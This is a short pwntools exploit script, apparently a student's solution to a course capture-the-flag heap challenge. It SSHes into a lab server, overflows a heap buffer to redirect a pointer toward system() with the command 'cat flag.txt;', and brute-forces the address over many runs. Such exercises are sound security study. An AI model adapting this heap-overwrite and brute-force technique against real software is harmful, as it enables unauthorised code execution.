# heap0ex.py - Aidan Wech (Onyxymous)
# /problems/heap0r-64_1_58bc2036dbfefc845444c8b93b1491cd/
from pwn import *

# ssh variables
name = 'xxxxxx'
host = 'cs4401shell2.walls.ninja'
keyfile = 'xxxxxx'
d = '/problems/heap0r-64_1_58bc2036dbfefc845444c8b93b1491cd/'

# exploit variables
env_scanoffset = 48
systemoffset = 0xBB6420

# exploit string
exploit = flat(
	{
		0: b'cat flag.txt;',
		env_scanoffset: b'13de'
	},
	b'aaaa',
	p64(systemoffset)[:3]
)

s = ssh(name, host, keyfile=keyfile)
s.set_working_directory(d)

# just try to brute force the address many times
for i in range(10000):
	with context.silent:
		p = s.process([b'./heap0-64', exploit])
		mesg = p.recvall(timeout=1)
	
	# if something interesting happened
	if mesg != b'':
		log.info(f'+{i}: {mesg}')
